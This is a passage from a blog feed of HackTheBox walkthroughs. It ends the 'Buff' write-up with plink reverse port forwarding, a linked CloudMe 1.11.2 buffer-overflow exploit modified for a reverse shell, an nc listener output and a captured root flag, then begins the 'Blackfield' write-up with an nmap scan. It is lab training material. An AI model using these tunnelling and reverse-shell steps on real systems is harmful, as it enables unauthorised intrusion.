  <span class="n">TCP</span>    <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">49669</span>          <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">0</span>              <span class="n">LISTENING</span>
  <span class="n">TCP</span>    <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.198</span><span class="p">:</span><span class="mi">139</span>       <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">0</span>              <span class="n">LISTENING</span>
  <span class="n">TCP</span>    <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.198</span><span class="p">:</span><span class="mi">8080</span>      <span class="mf">10.10</span><span class="p">.</span><span class="mf">14.33</span><span class="p">:</span><span class="mi">37962</span>      <span class="n">ESTABLISHED</span>
  <span class="n">TCP</span>    <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.198</span><span class="p">:</span><span class="mi">8080</span>      <span class="mf">10.10</span><span class="p">.</span><span class="mf">14.41</span><span class="p">:</span><span class="mi">34394</span>      <span class="n">FIN_WAIT_2</span>
  <span class="n">TCP</span>    <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.198</span><span class="p">:</span><span class="mi">8080</span>      <span class="mf">10.10</span><span class="p">.</span><span class="mf">14.51</span><span class="p">:</span><span class="mi">58486</span>      <span class="n">CLOSE_WAIT</span>
  <span class="n">TCP</span>    <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.198</span><span class="p">:</span><span class="mi">8080</span>      <span class="mf">10.10</span><span class="p">.</span><span class="mf">14.51</span><span class="p">:</span><span class="mi">58488</span>      <span class="n">TIME_WAIT</span>
  <span class="n">TCP</span>    <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.198</span><span class="p">:</span><span class="mi">8080</span>      <span class="mf">10.10</span><span class="p">.</span><span class="mf">14.51</span><span class="p">:</span><span class="mi">58490</span>      <span class="n">ESTABLISHED</span>
  <span class="n">TCP</span>    <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.198</span><span class="p">:</span><span class="mi">50676</span>     <span class="mf">10.10</span><span class="p">.</span><span class="mf">14.33</span><span class="p">:</span><span class="mi">22</span>         <span class="n">CLOSE_WAIT</span>
  <span class="n">TCP</span>    <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.198</span><span class="p">:</span><span class="mi">50809</span>     <span class="mf">10.10</span><span class="p">.</span><span class="mf">14.33</span><span class="p">:</span><span class="mi">22</span>         <span class="n">ESTABLISHED</span>
  <span class="n">TCP</span>    <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.198</span><span class="p">:</span><span class="mi">50879</span>     <span class="mf">10.10</span><span class="p">.</span><span class="mf">14.33</span><span class="p">:</span><span class="mi">22</span>         <span class="n">CLOSE_WAIT</span>
  <span class="n">TCP</span>    <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.198</span><span class="p">:</span><span class="mi">51491</span>     <span class="mf">10.10</span><span class="p">.</span><span class="mf">14.33</span><span class="p">:</span><span class="mi">6969</span>       <span class="n">ESTABLISHED</span>
  <span class="n">TCP</span>    <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.198</span><span class="p">:</span><span class="mi">51506</span>     <span class="mf">10.10</span><span class="p">.</span><span class="mf">14.33</span><span class="p">:</span><span class="mi">22</span>         <span class="n">ESTABLISHED</span>
  <span class="n">TCP</span>    <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.198</span><span class="p">:</span><span class="mi">51565</span>     <span class="mf">10.10</span><span class="p">.</span><span class="mf">14.33</span><span class="p">:</span><span class="mi">1122</span>       <span class="n">ESTABLISHED</span>
  <span class="n">TCP</span>    <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.198</span><span class="p">:</span><span class="mi">53167</span>     <span class="mf">10.10</span><span class="p">.</span><span class="mf">14.51</span><span class="p">:</span><span class="mi">22</span>         <span class="n">ESTABLISHED</span>
  <span class="n">TCP</span>    <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.198</span><span class="p">:</span><span class="mi">53191</span>     <span class="mf">10.10</span><span class="p">.</span><span class="mf">14.51</span><span class="p">:</span><span class="mi">5577</span>       <span class="n">ESTABLISHED</span>
  <span class="n">TCP</span>    <span class="mf">127.0</span><span class="p">.</span><span class="mf">0.1</span><span class="p">:</span><span class="mi">3306</span>         <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">0</span>              <span class="n">LISTENING</span>
  <span class="n">TCP</span>    <span class="mf">127.0</span><span class="p">.</span><span class="mf">0.1</span><span class="p">:</span><span class="mi">8888</span>         <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">0</span>              <span class="n">LISTENING</span>
  <span class="n">TCP</span>    <span class="mf">127.0</span><span class="p">.</span><span class="mf">0.1</span><span class="p">:</span><span class="mi">53175</span>        <span class="mf">127.0</span><span class="p">.</span><span class="mf">0.1</span><span class="p">:</span><span class="mi">3306</span>         <span class="n">TIME_WAIT</span>
  <span class="n">TCP</span>    <span class="mf">127.0</span><span class="p">.</span><span class="mf">0.1</span><span class="p">:</span><span class="mi">53177</span>        <span class="mf">127.0</span><span class="p">.</span><span class="mf">0.1</span><span class="p">:</span><span class="mi">3306</span>         <span class="n">TIME_WAIT</span>
  <span class="n">TCP</span>    <span class="p">[::]:</span><span class="mi">135</span>               <span class="p">[::]:</span><span class="mi">0</span>                 <span class="n">LISTENING</span>
  <span class="n">TCP</span>    <span class="p">[::]:</span><span class="mi">445</span>               <span class="p">[::]:</span><span class="mi">0</span>                 <span class="n">LISTENING</span>
  <span class="n">TCP</span>    <span class="p">[::]:</span><span class="mi">7680</span>              <span class="p">[::]:</span><span class="mi">0</span>                 <span class="n">LISTENING</span>
  <span class="n">TCP</span>    <span class="p">[::]:</span><span class="mi">8080</span>              <span class="p">[::]:</span><span class="mi">0</span>                 <span class="n">LISTENING</span>
  <span class="n">TCP</span>    <span class="p">[::]:</span><span class="mi">49664</span>             <span class="p">[::]:</span><span class="mi">0</span>                 <span class="n">LISTENING</span>
  <span class="n">TCP</span>    <span class="p">[::]:</span><span class="mi">49665</span>             <span class="p">[::]:</span><span class="mi">0</span>                 <span class="n">LISTENING</span>
  <span class="n">TCP</span>    <span class="p">[::]:</span><span class="mi">49666</span>             <span class="p">[::]:</span><span class="mi">0</span>                 <span class="n">LISTENING</span>
  <span class="n">TCP</span>    <span class="p">[::]:</span><span class="mi">49667</span>             <span class="p">[::]:</span><span class="mi">0</span>                 <span class="n">LISTENING</span>
  <span class="n">TCP</span>    <span class="p">[::]:</span><span class="mi">49668</span>             <span class="p">[::]:</span><span class="mi">0</span>                 <span class="n">LISTENING</span>
  <span class="n">TCP</span>    <span class="p">[::]:</span><span class="mi">49669</span>             <span class="p">[::]:</span><span class="mi">0</span>                 <span class="n">LISTENING</span>
  <span class="n">UDP</span>    <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">123</span>            <span class="o">*</span><span class="p">:</span><span class="o">*</span>                    
  <span class="n">UDP</span>    <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">5050</span>           <span class="o">*</span><span class="p">:</span><span class="o">*</span>                    
  <span class="n">UDP</span>    <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">5353</span>           <span class="o">*</span><span class="p">:</span><span class="o">*</span>                    
  <span class="n">UDP</span>    <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">5355</span>           <span class="o">*</span><span class="p">:</span><span class="o">*</span>                    
  <span class="n">UDP</span>    <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">64168</span>          <span class="o">*</span><span class="p">:</span><span class="o">*</span>                    
  <span class="n">UDP</span>    <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.198</span><span class="p">:</span><span class="mi">137</span>       <span class="o">*</span><span class="p">:</span><span class="o">*</span>                    
  <span class="n">UDP</span>    <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.198</span><span class="p">:</span><span class="mi">138</span>       <span class="o">*</span><span class="p">:</span><span class="o">*</span>                    
  <span class="n">UDP</span>    <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.198</span><span class="p">:</span><span class="mi">1900</span>      <span class="o">*</span><span class="p">:</span><span class="o">*</span>                    
  <span class="n">UDP</span>    <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.198</span><span class="p">:</span><span class="mi">59086</span>     <span class="o">*</span><span class="p">:</span><span class="o">*</span>                    
  <span class="n">UDP</span>    <span class="mf">127.0</span><span class="p">.</span><span class="mf">0.1</span><span class="p">:</span><span class="mi">1900</span>         <span class="o">*</span><span class="p">:</span><span class="o">*</span>                    
  <span class="n">UDP</span>    <span class="mf">127.0</span><span class="p">.</span><span class="mf">0.1</span><span class="p">:</span><span class="mi">58106</span>        <span class="o">*</span><span class="p">:</span><span class="o">*</span>                    
  <span class="n">UDP</span>    <span class="mf">127.0</span><span class="p">.</span><span class="mf">0.1</span><span class="p">:</span><span class="mi">59087</span>        <span class="o">*</span><span class="p">:</span><span class="o">*</span>                    
  <span class="n">UDP</span>    <span class="p">[::]:</span><span class="mi">123</span>               <span class="o">*</span><span class="p">:</span><span class="o">*</span>                    
  <span class="n">UDP</span>    <span class="p">[::]:</span><span class="mi">5353</span>              <span class="o">*</span><span class="p">:</span><span class="o">*</span>                    
  <span class="n">UDP</span>    <span class="p">[::]:</span><span class="mi">5355</span>              <span class="o">*</span><span class="p">:</span><span class="o">*</span>                    
  <span class="n">UDP</span>    <span class="p">[::]:</span><span class="mi">64168</span>             <span class="o">*</span><span class="p">:</span><span class="o">*</span>                    
  <span class="n">UDP</span>    <span class="p">[::</span><span class="mi">1</span><span class="p">]:</span><span class="mi">1900</span>             <span class="o">*</span><span class="p">:</span><span class="o">*</span>                    
  <span class="n">UDP</span>    <span class="p">[::</span><span class="mi">1</span><span class="p">]:</span><span class="mi">59085</span>            <span class="o">*</span><span class="p">:</span><span class="o">*</span>                    
  <span class="n">UDP</span>    <span class="p">[</span><span class="n">fe80</span><span class="p">::</span><span class="n">edcd</span><span class="p">:</span><span class="mi">7573</span><span class="p">:</span><span class="n">f6e</span><span class="p">:</span><span class="n">abdb</span><span class="o">%</span><span class="mi">10</span><span class="p">]:</span><span class="mi">1900</span>  <span class="o">*</span><span class="p">:</span><span class="o">*</span>                    
  <span class="n">UDP</span>    <span class="p">[</span><span class="n">fe80</span><span class="p">::</span><span class="n">edcd</span><span class="p">:</span><span class="mi">7573</span><span class="p">:</span><span class="n">f6e</span><span class="p">:</span><span class="n">abdb</span><span class="o">%</span><span class="mi">10</span><span class="p">]:</span><span class="mi">59084</span>  <span class="o">*</span><span class="p">:</span><span class="o">*</span>                  
</code></pre></div></div>

<h3 id="comparing-the-procress-with-all-the-procress-details">Comparing the procress with all the procress details..</h3>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">C</span><span class="p">:\</span><span class="n">xampp</span><span class="p">\</span><span class="n">htdocs</span><span class="p">\</span><span class="n">gym</span><span class="p">\</span><span class="n">upload</span><span class="o">&gt;</span><span class="n">powershell</span> <span class="n">ps</span>
<span class="n">powershell</span> <span class="n">ps</span>

<span class="no">Handles</span>  <span class="no">NPM</span><span class="p">(</span><span class="no">K</span><span class="p">)</span>    <span class="no">PM</span><span class="p">(</span><span class="no">K</span><span class="p">)</span>      <span class="no">WS</span><span class="p">(</span><span class="no">K</span><span class="p">)</span>     <span class="no">CPU</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>     <span class="no">Id</span>  <span class="no">SI</span> <span class="no">ProcessName</span>                                                  
<span class="o">-------</span>  <span class="o">------</span>    <span class="o">-----</span>      <span class="o">-----</span>     <span class="o">------</span>     <span class="o">--</span>  <span class="o">--</span> <span class="o">-----------</span>                                                  
    <span class="mi">432</span>      <span class="mi">24</span>    <span class="mi">18324</span>       <span class="mi">9180</span>              <span class="mi">6612</span>   <span class="mi">1</span> <span class="no">ApplicationFrameHost</span>                                         
    <span class="mi">161</span>      <span class="mi">10</span>     <span class="mi">1940</span>       <span class="mi">2176</span>              <span class="mi">7140</span>   <span class="mi">1</span> <span class="n">browser_broker</span>                                               
    <span class="mi">237</span>      <span class="mi">19</span>    <span class="mi">26404</span>      <span class="mi">29328</span>              <span class="mi">5536</span>   <span class="mi">0</span> <span class="no">CloudMe</span>                                                      
    <span class="mi">286</span>      <span class="mi">62</span>    <span class="mi">30312</span>        <span class="mi">372</span>              <span class="mi">6088</span>   <span class="mi">0</span> <span class="no">CloudMe</span>                                                      
    <span class="mi">289</span>      <span class="mi">16</span>     <span class="mi">2896</span>       <span class="mi">2548</span>       <span class="mf">0.17</span>   <span class="mi">1396</span>   <span class="mi">0</span> <span class="no">CloudMe_1112</span>                                                 
    <span class="mi">269</span>      <span class="mi">16</span>     <span class="mi">2868</span>        <span class="mi">200</span>       <span class="mf">0.98</span>   <span class="mi">8772</span>   <span class="mi">0</span> <span class="no">CloudMe_1112</span>      
</code></pre></div></div>

<p>This command in PowerShell is used to print what program/process is running. You can see 5536 is the PID of CloudMe software.</p>

<p>This is conformed after finding <code class="language-plaintext highlighter-rouge">cloudme</code> is running in <code class="language-plaintext highlighter-rouge">Downloads</code> folder of <code class="language-plaintext highlighter-rouge">Shaun</code>.</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">C</span><span class="p">:\</span><span class="no">Users</span><span class="p">\</span><span class="n">shaun</span><span class="p">\</span><span class="no">Downloads</span><span class="o">&gt;</span><span class="n">dir</span>
<span class="n">dir</span>
 <span class="no">Volume</span> <span class="k">in</span> <span class="n">drive</span> <span class="no">C</span> <span class="n">has</span> <span class="n">no</span> <span class="n">label</span><span class="o">.</span>
 <span class="no">Volume</span> <span class="no">Serial</span> <span class="no">Number</span> <span class="n">is</span> <span class="no">A22D</span><span class="o">-</span><span class="mi">49</span><span class="no">F7</span>

 <span class="no">Directory</span> <span class="n">of</span> <span class="no">C</span><span class="p">:\</span><span class="no">Users</span><span class="p">\</span><span class="n">shaun</span><span class="p">\</span><span class="no">Downloads</span>

<span class="mi">23</span><span class="o">/</span><span class="mo">07</span><span class="o">/</span><span class="mi">2020</span>  <span class="mo">07</span><span class="p">:</span><span class="mi">58</span>    <span class="o">&lt;</span><span class="no">DIR</span><span class="o">&gt;</span>          <span class="o">.</span>
<span class="mi">23</span><span class="o">/</span><span class="mo">07</span><span class="o">/</span><span class="mi">2020</span>  <span class="mo">07</span><span class="p">:</span><span class="mi">58</span>    <span class="o">&lt;</span><span class="no">DIR</span><span class="o">&gt;</span>          <span class="o">..</span>
<span class="mi">23</span><span class="o">/</span><span class="mo">07</span><span class="o">/</span><span class="mi">2020</span>  <span class="mo">05</span><span class="p">:</span><span class="mi">35</span>            <span class="mi">61</span><span class="p">,</span><span class="mi">440</span> <span class="n">nc</span><span class="p">.</span><span class="nf">exe</span>
<span class="mi">23</span><span class="o">/</span><span class="mo">07</span><span class="o">/</span><span class="mi">2020</span>  <span class="mo">07</span><span class="p">:</span><span class="mi">56</span>           <span class="mi">675</span><span class="p">,</span><span class="mi">752</span> <span class="n">plink</span><span class="p">.</span><span class="nf">exe</span>
               <span class="mi">3</span> <span class="no">File</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>     <span class="mi">18</span><span class="p">,</span><span class="mi">568</span><span class="p">,</span><span class="mo">016</span> <span class="n">bytes</span>
               <span class="mi">2</span> <span class="no">Dir</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>   <span class="mi">9</span><span class="p">,</span><span class="mi">798</span><span class="p">,</span><span class="mi">672</span><span class="p">,</span><span class="mi">384</span> <span class="n">bytes</span> <span class="n">free</span>
</code></pre></div></div>

<h2 id="privilege-escalation">Privilege Escalation</h2>

<h3 id="so-here-is-the-game-plan">So here is the game plan</h3>

<p><code class="language-plaintext highlighter-rouge">Port forwarding to expose remote port 8888 (accessible only from localhost) to YOURPORT local</code></p>

<h2 id="step-1">Step 1</h2>

<h3 id="enable-sshd-service-on-your-kali-machine">Enable <code class="language-plaintext highlighter-rouge">sshd</code> service on your kali machine:</h3>
<p><code class="language-plaintext highlighter-rouge">sudo systemctl start ssh.socket</code></p>

<h2 id="step-2">Step 2</h2>
<h3 id="use-plink-to-portforward-on-your-local-listener">Use <code class="language-plaintext highlighter-rouge">Plink</code> to portforward on your local listener</h3>

<p><code class="language-plaintext highlighter-rouge">plink.exe -v -x -a -T -C -noagent -ssh -pw {Password} -R {Your_Port}:127.0.0.1:8888 user@{IP_address}</code></p>

<p>If every thing works correctly.. You should see this ..</p>

<p><img src="/assets/img/sample/buff/buff6.png" alt="" /></p>

<h2 id="cloudme-1112--cve--administrator">CloudMe 1.11.2 -CVE – Administrator:</h2>

<p><code class="language-plaintext highlighter-rouge">Exploit for CloudMe 1.11.2: https://www.exploit-db.com/exploits/48389</code></p>

<h3 id="the-shellcode-should-be-changed-in-order-to-get-the-reverse-shell">The shellcode should be changed in order to get the <code class="language-plaintext highlighter-rouge">reverse shell</code>.</h3>
<hr />
<hr />

<h2 id="note">Note:</h2>

<p><code> Use some higher port in order to get the reverse shell perfectly, cause there are so many people bashing the same machine at same time.</code></p>

<hr />
<h3 id="you-should-see-this-if-the-exploit-runs-correctly">you should see this if the exploit runs correctly.</h3>

<p><img src="/assets/img/sample/buff/buff7.png" alt="" /></p>

<p>Once Every this is set and run properly then you should be good to get the <code class="language-plaintext highlighter-rouge">reverse shell</code> and grab the <code class="language-plaintext highlighter-rouge">Root.txt</code></p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">nc</span> <span class="o">-</span><span class="n">lnvp</span> <span class="mi">60000</span>
<span class="n">listening</span> <span class="n">on</span> <span class="p">[</span><span class="n">any</span><span class="p">]</span> <span class="mi">60000</span> <span class="o">...</span>
<span class="n">connect</span> <span class="n">to</span> <span class="p">[</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">14.51</span><span class="p">]</span> <span class="n">from</span> <span class="p">(</span><span class="no">UNKNOWN</span><span class="p">)</span> <span class="p">[</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">10.198</span><span class="p">]</span> <span class="mi">49723</span>
<span class="no">Microsoft</span> <span class="no">Windows</span> <span class="p">[</span><span class="no">Version</span> <span class="mf">10.0</span><span class="o">.</span><span class="mf">17134.1550</span><span class="p">]</span>
<span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="mi">2018</span> <span class="no">Microsoft</span> <span class="no">Corporation</span><span class="o">.</span> <span class="no">All</span> <span class="n">rights</span> <span class="n">reserved</span><span class="o">.</span>

<span class="no">C</span><span class="p">:\</span><span class="no">Windows</span><span class="p">\</span><span class="n">system32</span><span class="o">&gt;</span>
</code></pre></div></div>

<h2 id="getting-roottxt">Getting Root.txt</h2>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C</span><span class="p">:</span>\<span class="n">Windows</span>\<span class="n">system32</span><span class="o">&gt;</span><span class="n">cd</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">Administrator</span>\<span class="n">Desktop</span>
<span class="n">cd</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">Administrator</span>\<span class="n">Desktop</span>

<span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">Administrator</span>\<span class="n">Desktop</span><span class="o">&gt;</span><span class="nb">type</span> <span class="n">root</span><span class="p">.</span><span class="n">txt</span>
<span class="nb">type</span> <span class="n">root</span><span class="p">.</span><span class="n">txt</span>
<span class="mf">2e881649240</span><span class="n">e8868c48daee707659212</span>

<span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">Administrator</span>\
</code></pre></div></div>
<p>If you like my work, please do consider giving me +rep on HACKTHEBOX.</p>

<p>My HackTheBox profile: <a href="https://www.hackthebox.eu/home/users/profile/291968">https://www.hackthebox.eu/home/users/profile/291968</a></p>]]></content><author><name>jeevan</name></author><category term="[&quot;hackthebox&quot;, &quot;retired&quot;]" /><category term="windows" /><category term="cve" /><category term="portforwarding" /><summary type="html"><![CDATA[Buff is a Hackthebox active machine, so you need the Admin hash to decrypt the walkthrough!]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/sample/buff/buff.png" /><media:content medium="image" url="http://localhost:4000/assets/img/sample/buff/buff.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Hackthebox Blackfiled</title><link href="http://localhost:4000/hackthebox/retired/2020/07/11/Blackfield.html" rel="alternate" type="text/html" title="Hackthebox Blackfiled" /><published>2020-07-11T21:50:00+05:30</published><updated>2020-07-11T21:50:00+05:30</updated><id>http://localhost:4000/hackthebox/retired/2020/07/11/Blackfield</id><content type="html" xml:base="http://localhost:4000/hackthebox/retired/2020/07/11/Blackfield.html"><![CDATA[<h2 id="info">INFO:</h2>

<table>
  <thead>
    <tr>
      <th>Blackfield</th>
      <th> </th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>OS:</td>
      <td>Windows</td>
    </tr>
    <tr>
      <td>Difficulty:</td>
      <td>Hard</td>
    </tr>
    <tr>
      <td>Points:</td>
      <td>40</td>
    </tr>
    <tr>
      <td>Release:</td>
      <td>06 Jun 2020</td>
    </tr>
    <tr>
      <td>IP:</td>
      <td>10.10.10.192</td>
    </tr>
  </tbody>
</table>

<h2 id="lets-start-hacking-into-blackfiled">let’s start hacking into <code class="language-plaintext highlighter-rouge">blackfiled</code></h2>

<h3 id="as-always-hacking-starts-with-nmap-scan">As always hacking starts with NMAP scan.</h3>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">root</span><span class="vi">@Ac3</span><span class="ss">:~</span><span class="c1"># nmap -O -A -T4 blackfiled.htb                                                                                                                                                                                             </span>
<span class="no">Starting</span> <span class="no">Nmap</span> <span class="mf">7.80</span> <span class="p">(</span> <span class="n">https</span><span class="ss">:/</span><span class="o">/</span><span class="n">nmap</span><span class="p">.</span><span class="nf">org</span> <span class="p">)</span> <span class="n">at</span> <span class="mi">2020</span><span class="o">-</span><span class="mo">07</span><span class="o">-</span><span class="mi">11</span> <span class="mi">08</span><span class="p">:</span><span class="mi">45</span> <span class="no">EDT</span>                                                                                                                                                                            
<span class="no">Nmap</span> <span class="nb">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="n">blackfiled</span><span class="p">.</span><span class="nf">htb</span> <span class="p">(</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">10.192</span><span class="p">)</span>                                                                                                                                                                                         
<span class="no">Host</span> <span class="n">is</span> <span class="n">up</span> <span class="p">(</span><span class="mf">0.19</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="o">.</span>                                                                                                                                                                                                                
<span class="no">Not</span> <span class="ss">shown: </span><span class="mi">993</span> <span class="n">filtered</span> <span class="n">ports</span>                                                                                                                                                                                                              
<span class="no">PORT</span>     <span class="no">STATE</span> <span class="no">SERVICE</span>       <span class="no">VERSION</span>                                                                                                                                                                                                       
<span class="mi">53</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">domain?</span>                                                                                                                                                                                                                     
<span class="o">|</span> <span class="n">fingerprint</span><span class="o">-</span><span class="ss">strings:                                                                                                                                                                                                                     
</span><span class="o">|</span>   <span class="no">DNSVersionBindReqTCP</span><span class="p">:</span>                                                                                                                                                                                                                  
<span class="o">|</span>     <span class="n">version</span>
<span class="o">|</span><span class="n">_</span>    <span class="n">bind</span>
<span class="mi">88</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">kerberos</span><span class="o">-</span><span class="n">sec</span>  <span class="no">Microsoft</span> <span class="no">Windows</span> <span class="no">Kerberos</span> <span class="p">(</span><span class="n">server</span> <span class="ss">time: </span><span class="mi">2020</span><span class="o">-</span><span class="mo">07</span><span class="o">-</span><span class="mi">11</span> <span class="mi">19</span><span class="p">:</span><span class="mi">49</span><span class="p">:</span><span class="mo">04</span><span class="no">Z</span><span class="p">)</span>
<span class="mi">135</span><span class="o">/</span><span class="n">tcp</span>  <span class="nb">open</span>  <span class="n">msrpc</span>         <span class="no">Microsoft</span> <span class="no">Windows</span> <span class="no">RPC</span>
<span class="mi">389</span><span class="o">/</span><span class="n">tcp</span>  <span class="nb">open</span>  <span class="n">ldap</span>          <span class="no">Microsoft</span> <span class="no">Windows</span> <span class="no">Active</span> <span class="no">Directory</span> <span class="no">LDAP</span> <span class="p">(</span><span class="no">Domain</span><span class="p">:</span> <span class="no">BLACKFIELD</span><span class="p">.</span><span class="nf">local0</span><span class="p">.</span><span class="nf">,</span> <span class="no">Site</span><span class="p">:</span> <span class="no">Default</span><span class="o">-</span><span class="no">First</span><span class="o">-</span><span class="no">Site</span><span class="o">-</span><span class="no">Name</span><span class="p">)</span>
<span class="mi">445</span><span class="o">/</span><span class="n">tcp</span>  <span class="nb">open</span>  <span class="n">microsoft</span><span class="o">-</span><span class="n">ds?</span>
<span class="mi">593</span><span class="o">/</span><span class="n">tcp</span>  <span class="nb">open</span>  <span class="n">ncacn_http</span>    <span class="no">Microsoft</span> <span class="no">Windows</span> <span class="no">RPC</span> <span class="n">over</span> <span class="no">HTTP</span> <span class="mf">1.0</span>
<span class="mi">3268</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">ldap</span>          <span class="no">Microsoft</span> <span class="no">Windows</span> <span class="no">Active</span> <span class="no">Directory</span> <span class="no">LDAP</span> <span class="p">(</span><span class="no">Domain</span><span class="p">:</span> <span class="no">BLACKFIELD</span><span class="p">.</span><span class="nf">local0</span><span class="p">.</span><span class="nf">,</span> <span class="no">Site</span><span class="p">:</span> <span class="no">Default</span><span class="o">-</span><span class="no">First</span><span class="o">-</span><span class="no">Site</span><span class="o">-</span><span class="no">Name</span><span class="p">)</span>
<span class="mi">1</span> <span class="n">service</span> <span class="n">unrecognized</span> <span class="n">despite</span> <span class="n">returning</span> <span class="n">data</span><span class="o">.</span> <span class="no">If</span> <span class="n">you</span> <span class="n">know</span> <span class="n">the</span> <span class="n">service</span><span class="o">/</span><span class="n">version</span><span class="p">,</span> <span class="n">please</span> <span class="n">submit</span> <span class="n">the</span> <span class="n">following</span> <span class="n">fingerprint</span> <span class="n">at</span> <span class="n">https</span><span class="ss">:/</span><span class="o">/</span><span class="n">nmap</span><span class="p">.</span><span class="nf">org</span><span class="o">/</span><span class="n">cgi</span><span class="o">-</span><span class="n">bin</span><span class="o">/</span><span class="n">submit</span><span class="p">.</span><span class="nf">cgi?</span><span class="n">new</span><span class="o">-</span><span class="n">service</span> <span class="p">:</span>
<span class="no">SF</span><span class="o">-</span><span class="no">Port53</span><span class="o">-</span><span class="no">TCP</span><span class="ss">:V</span><span class="o">=</span><span class="mf">7.80</span><span class="o">%</span><span class="no">I</span><span class="o">=</span><span class="mi">7</span><span class="o">%</span><span class="no">D</span><span class="o">=</span><span class="mi">7</span><span class="o">/</span><span class="mi">11</span><span class="o">%</span><span class="no">Time</span><span class="o">=</span><span class="mi">5</span><span class="no">F09B484</span><span class="o">%</span><span class="no">P</span><span class="o">=</span><span class="n">x86_64</span><span class="o">-</span><span class="n">pc</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnu</span><span class="o">%</span><span class="n">r</span><span class="p">(</span><span class="no">DNSV</span>
<span class="no">SF</span><span class="ss">:ersionBindReqTCP</span><span class="p">,</span><span class="mi">20</span><span class="p">,</span><span class="s2">"</span><span class="se">\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07</span><span class="s2">version\
SF:x04bind</span><span class="se">\0\0\x10\0\x03</span><span class="s2">"</span><span class="p">);</span>
<span class="no">Warning</span><span class="p">:</span> <span class="no">OSScan</span> <span class="n">results</span> <span class="n">may</span> <span class="n">be</span> <span class="n">unreliable</span> <span class="n">because</span> <span class="n">we</span> <span class="n">could</span> <span class="ow">not</span> <span class="n">find</span> <span class="n">at</span> <span class="n">least</span> <span class="mi">1</span> <span class="nb">open</span> <span class="ow">and</span> <span class="mi">1</span> <span class="n">closed</span> <span class="n">port</span>
<span class="no">OS</span> <span class="n">fingerprint</span> <span class="ow">not</span> <span class="n">ideal</span> <span class="ss">because: </span><span class="no">Missing</span> <span class="n">a</span> <span class="n">closed</span> <span class="no">TCP</span> <span class="n">port</span> <span class="n">so</span> <span class="n">results</span> <span class="n">incomplete</span>
<span class="no">No</span> <span class="no">OS</span> <span class="n">matches</span> <span class="k">for</span> <span class="n">host</span>
<span class="no">Network</span> <span class="no">Distance</span><span class="p">:</span> <span class="mi">2</span> <span class="n">hops</span>
<span class="no">Service</span> <span class="no">Info</span><span class="p">:</span> <span class="no">Host</span><span class="p">:</span> <span class="no">DC01</span><span class="p">;</span> <span class="no">OS</span><span class="p">:</span> <span class="no">Windows</span><span class="p">;</span> <span class="no">CPE</span><span class="p">:</span> <span class="n">cpe</span><span class="ss">:/</span><span class="n">o</span><span class="ss">:microsoft:windows</span>

<span class="no">Host</span> <span class="n">script</span> <span class="ss">results:
</span><span class="o">|</span><span class="n">_clock</span><span class="o">-</span><span class="ss">skew: </span><span class="mi">7</span><span class="n">h03m11s</span>
<span class="o">|</span> <span class="n">smb2</span><span class="o">-</span><span class="n">security</span><span class="o">-</span><span class="ss">mode: 
</span><span class="o">|</span>   <span class="mf">2.02</span><span class="p">:</span> 
